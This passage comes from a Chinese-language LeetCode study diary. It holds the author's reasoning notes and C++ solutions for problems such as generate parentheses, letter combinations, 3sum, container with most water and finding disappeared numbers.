punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> left <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> left<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> right <span class="token operator">></span> left<span class="token punctuation">;</span> right<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 是否考虑数组只有一个数字</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">reverse</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/01/19/osqg5QPNem6SAuU.png"alt="image-20230119011004353" /><figcaption aria-hidden="true">image-20230119011004353</figcaption></figure><h3 id="section">2022-01-16</h3><h4 id="括号生成"><ahref="https://leetcode.cn/problems/generate-parentheses/">22.括号生成</a></h4><ul><li><p>我思：</p><ul><li><p>全部有效的括号，如何分类：可以根据括号嵌套层数，最深层数=n</p></li><li><p>还有个不同层数排序的问题：涉及数字的拆解，</p><ul><li>n = 5,（用最高层数限定，且必有这个最高层数）<ul><li>5<ul><li>5*1</li></ul></li><li>4(4,1)<ul><li>4+1</li><li>1+4</li></ul></li><li>3（3,2,1）<ul><li>3+2</li><li>2+3</li><li>3+1+1</li><li>1+3+1</li><li>1+1+3</li></ul></li><li>2（1,2）<ul><li>2+1+1+1</li><li>1+2+1+1</li><li>1+1+2+1</li><li>1+1+1+2</li></ul></li><li>1<ul><li>1+1+1+1+1</li></ul></li></ul></li><li>上面分类是错误的。还有可能这种情况：最深两层，但是第二层有两个并列的一层</li><li>因此什么算法能包含所有情况呢：我认为回溯法</li></ul></li><li><p>参考</p><ul><li>回溯法确实对的；问题是，我不知道递归单层该完成的任务</li><li>规则是：每层先尝试添加左括号，直到左括号不能添加为止再添加右括号。</li><li>那么递归终止条件是什么：<ul><li>可用括号数量不够</li><li>使用的右括号数量超过了左括号</li></ul></li></ul></li><li><p>submit</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">generateParenthesis</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        vector<span class="token operator">&lt;</span>string<span class="token operator">></span> ans<span class="token punctuation">;</span>        string path<span class="token punctuation">;</span>        <span class="token function">backTrace</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// path 直接放空也行</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// ans 得是引用</span>    <span class="token comment">// left 是已用还是剩余需明确</span>    <span class="token keyword">void</span> <span class="token function">backTrace</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span>string<span class="token operator">></span><span class="token operator">&amp;</span> ans<span class="token punctuation">,</span> string path<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">></span> n <span class="token operator">||</span> right <span class="token operator">></span> n <span class="token operator">||</span> right <span class="token operator">></span> left<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 递归终止条件</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">==</span> n <span class="token operator">&amp;&amp;</span> right <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 压入返回值的条件(全部括号得用完，且左右相等)</span>            ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>     <span class="token comment">// 压入之后返回上一层 </span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 路径的生成在传参时完成</span>        <span class="token comment">// path 参数需要特别注意不能用引用，且使用加法更不会出错，因为返回上一层时，path的值还得是上一层的值，而不能是下一层的值</span>        <span class="token function">backTrace</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> path <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">,</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">backTrace</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> path <span class="token operator">+</span> <span class="token string">")"</span><span class="token punctuation">,</span> left<span class="token punctuation">,</span> right <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/01/16/YBOfm2SCD7kxAWM.png"alt="image-20230116222246838" /><figcaption aria-hidden="true">image-20230116222246838</figcaption></figure></li><li><p>dfs （回溯）</p></li><li><p>注意它括号的添加规则</p></li><li><p>注意到回溯，其实这确实也是一个从所有子集中选取符合条件子集的类型</p></li></ul></li></ul><h3 id="section-1">2022-01-14</h3><h4 id="电话号码的字母组合"><ahref="https://leetcode.cn/problems/letter-combinations-of-a-phone-number/">17.电话号码的字母组合</a></h4><ul><li>我思：<ol type="1"><li>列出数字与字母的映射</li><li>注意有多少个数字，组合的字母串就有多长</li><li>多重循环。（如果数字多是不是会超时）add:另外循环层数不确定，代码是写不出来的<ul><li>到此，我判断我的思路错误</li></ul></li></ol></li><li>递归三要素<ol type="1"><li>确定递归函数的参数和返回值</li><li>确定终止条件</li><li>确定单层递归的逻辑</li></ol></li><li>回溯三要素（代表性问题：集合中取满足条件的子集）<ol type="1"><li>回溯函数参数和返回值</li><li>回溯函数终止条件</li><li>回溯搜索的遍历（for循环 横向遍历，递归（回溯）纵向遍历）</li></ol></li><li>参考</li><li>submit</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">private</span><span class="token operator">:</span>    <span class="token keyword">const</span> string s<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"abc"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"ghi"</span><span class="token punctuation">,</span> <span class="token string">"jkl"</span><span class="token punctuation">,</span> <span class="token string">"mno"</span><span class="token punctuation">,</span> <span class="token string">"pqrs"</span><span class="token punctuation">,</span> <span class="token string">"tuv"</span><span class="token punctuation">,</span> <span class="token string">"wxyz"</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> ans<span class="token punctuation">;</span>    string path<span class="token punctuation">;</span>    <span class="token keyword">void</span> <span class="token function">backtracking</span><span class="token punctuation">(</span>string digits<span class="token punctuation">,</span> <span class="token keyword">int</span> level<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>level <span class="token operator">==</span> digits<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 终止条件：纵向遍历完(每条分支)</span>            ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 返回上一层</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> digit <span class="token operator">=</span> digits<span class="token punctuation">[</span>level<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token char">'0'</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">[</span>digit<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            path<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>digit<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// backtracking(digits, ++level);   // ++level的执行时间(所在层数)，这是错误的</span>            <span class="token function">backtracking</span><span class="token punctuation">(</span>digits<span class="token punctuation">,</span> level<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 返回上一层后，level的值还是本层的值，不会加一</span>            path<span class="token punctuation">.</span><span class="token function">pop_back</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 回溯，弹出最后一层</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    vector<span class="token operator">&lt;</span>string<span class="token operator">></span> <span class="token function">letterCombinations</span><span class="token punctuation">(</span>string digits<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>digits<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> ans<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">backtracking</span><span class="token punctuation">(</span>digits<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><ul><li>注意这个问题</li></ul><pre class="language-none"><code class="language-none">&#x2F;&#x2F; backtracking(digits, ++level);   &#x2F;&#x2F; ++level的执行时间(所在层数)，这是错误的backtracking(digits, level+1);     &#x2F;&#x2F; 返回上一层后，level的值还是本层的值，不会加一</code></pre><figure><img src="https://s2.loli.net/2023/01/14/6elTax8Eyf2rYuh.png"alt="image-20230114032944436" /><figcaption aria-hidden="true">image-20230114032944436</figcaption></figure><h3 id="section-2">2022-01-13</h3><h4 id="三数之和"><a href="https://leetcode.cn/problems/3sum/">15.三数之和</a></h4><ul><li>我的思路<ul><li>排序效果应该不错</li><li>参考双指针，采用三指针（<del>定2移1</del>）：这里我错了，因此陷入了一个胡同。因为双指针不需要固定指针，因此三指针应该是定1移2。</li></ul></li><li>参考思路<ul><li>看了下评论区，果然不出所料</li><li>问题在于如何移动指针，其实还是类似双指针<ul><li>固定左指针，移动中指针和右指针（将三指针转化为双指针）</li></ul></li><li>还注意到 有 <code>哈希-剪枝法</code></li></ul></li><li>submit</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">threeSum</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">sort</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 先排序</span>        vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> ans<span class="token punctuation">;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> mid<span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">||</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> ans<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// 每次固定左指针，最中、右指针处理</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>left<span class="token punctuation">;</span> left <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span> left<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>left <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>left<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// left 也得去重</span>                <span class="token keyword">continue</span><span class="token punctuation">;</span>   <span class="token comment">// 不是break</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// left 移动，则mid,right重置</span>            mid <span class="token operator">=</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            right <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    right<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">+</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    mid<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    ans<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token punctuation">&#123;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//  去重</span>                    <span class="token comment">// mid 先去重</span>                    mid<span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token keyword">while</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        mid<span class="token operator">++</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    right<span class="token operator">--</span><span class="token punctuation">;</span>                    <span class="token keyword">while</span> <span class="token punctuation">(</span>mid <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span> <span class="token operator">==</span> nums<span class="token punctuation">[</span>right <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        right<span class="token operator">--</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/01/13/f2U3YDbKH87xnRt.png"alt="image-20230113040033052" /><figcaption aria-hidden="true">image-20230113040033052</figcaption></figure><ul><li><ul><li>效率这么低</li><li>但是暂时不折腾了</li></ul></li><li>一题做了一晚上，天亮了，牛批<ul><li>脑子出问题了，没法debug，提交了多次错误的。（提交正确率今晚可降了不少:sob:</li></ul></li></ul><figure><img src="https://s2.loli.net/2023/01/13/JoInHm3p5qFU9lr.png"alt="image-20230113040338308" /><figcaption aria-hidden="true">image-20230113040338308</figcaption></figure><h3 id="section-3">2022-01-12</h3><h4 id="盛最多水的容器"><ahref="https://leetcode.cn/problems/container-with-most-water/">11.盛最多水的容器</a></h4><ul><li><strong>我的思路</strong><ul><li>分析：容积以两轴中短轴为准<ul><li>两根轴要尽可能远，且短轴尽可能高，能保证最大容积。但是显然最优解不一定要同时满足这两个条件。</li><li>这个问题本质是确定两个边界</li><li>问题是：如何确定这两个边界呢，暴力解法O(n²)不考虑</li><li>两个边界很容易联想到<strong>双指针</strong></li><li>双指针的移动规则怎么确定呢，是否要遍历每一种情况呢（显然不要，不然不就是暴力吗）</li></ul></li></ul></li><li><strong>参考答案</strong><ul><li>两个边界肯定不是同时移动，那么就是一次移动一个</li><li>每次不管左移还是右移，底边都是-1，因此得确保高尽量高，也就是长轴保持，移动短轴寻找更长轴</li><li>不容易注意到的一个问题是：如果要保证之后的结果比现在更大，那么最短轴一定要更长（因为底边再减小），也就是说每次移动，最短轴一定要变化。<strong>如果最短轴不变，那么这次移动是无效的。</strong></li></ul></li><li><strong>submit</strong></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">maxArea</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> height<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> height<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ans <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ans<span class="token punctuation">,</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">min</span><span class="token punctuation">(</span>height<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">,</span> height<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>height<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">&lt;</span> height<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                left<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                right<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> ans<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><figure><img src="https://s2.loli.net/2023/01/12/1wToSpzrQuWtLyq.png"alt="image-20230112012322777" /><figcaption aria-hidden="true">image-20230112012322777</figcaption></figure><h3 id="section-4">2022-12-28</h3><h4 id="删除字符串两端相同字符后的最短长度"><ahref="https://leetcode.cn/problems/minimum-length-of-string-after-deleting-similar-ends/">1750.删除字符串两端相同字符后的最短长度</a></h4><ul><li><p>我的思路：无</p></li><li><p>分析：</p><ul><li>双指针法</li><li>不能有交集：left &lt; right</li><li>边界处理<ul><li>s长度为1：无法删除</li></ul></li></ul></li><li><p>submit</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">minimumLength</span><span class="token punctuation">(</span>string s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 双指针法</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> right <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>left<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                left<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>left <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 删除左边的全部</span>                    left<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                right<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> right <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>right <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 删除右边的全部</span>                    right<span class="token operator">--</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><h3 id="section-5">2022-12-27</h3><h4 id="找到所有数组中消失的数字"><ahref="https://leetcode.cn/problems/find-all-numbers-disappeared-in-an-array/">448.找到所有数组中消失的数字</a></h4><ul><li>自己没有特别好的思路</li><li>我的第一思路：遍历一遍数组，记录每个数字出现的次数</li></ul><pre class="language-none"><code class="language-none">nums &#x3D; [4,3,2,7,8,2,3,1]</code></pre><p>例如上述数组：</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">数组s<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">++</span></code></pre><p>最后统计值为0的下标</p><ul><li>评论区看到的巧妙解法</li></ul><figure><img src="https://s2.loli.net/2022/12/26/qBLNDi9wk1AvSl4.png"alt="image-20221226235202663" /><figcaption aria-hidden="true">image-20221226235202663</figcaption></figure><blockquote><ul><li>本质上还是将研究的那一串数字，作为下标去研究，此解法是做标记（正负数区分）</li></ul></blockquote><ul><li>submit</li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">findDisappearedNumbers</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token 